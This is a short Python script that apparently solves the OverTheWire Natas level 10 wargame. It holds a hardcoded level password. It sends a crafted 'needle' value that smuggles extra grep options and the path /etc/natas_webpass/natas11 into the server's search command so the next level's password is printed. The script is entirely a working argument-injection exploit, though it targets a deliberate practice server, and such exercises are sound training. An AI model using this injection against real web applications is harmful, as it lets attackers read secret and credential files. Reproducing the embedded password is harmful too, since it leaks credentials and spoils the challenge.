import urllib.parse

import requests
from requests.models import HTTPBasicAuth

URL = "http://natas10.natas.labs.overthewire.org/"
USERNAME = "natas10"
PASSWORD = "t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu"


def url_encode_string(command: str):
    return urllib.parse.quote(command)


param = "needle"
value = url_encode_string("-E '.*' /etc/natas_webpass/natas11")

headers = {
    "Content-Type": "application/json",
    "User-Agent": "insomnia/10.0.0",
}

response = requests.request(
    "GET",
    f"{URL}?{param}={value}",
    auth=HTTPBasicAuth(USERNAME, PASSWORD),
    headers=headers,
    timeout=(10, 10),
)

print(response.status_code, response.text)
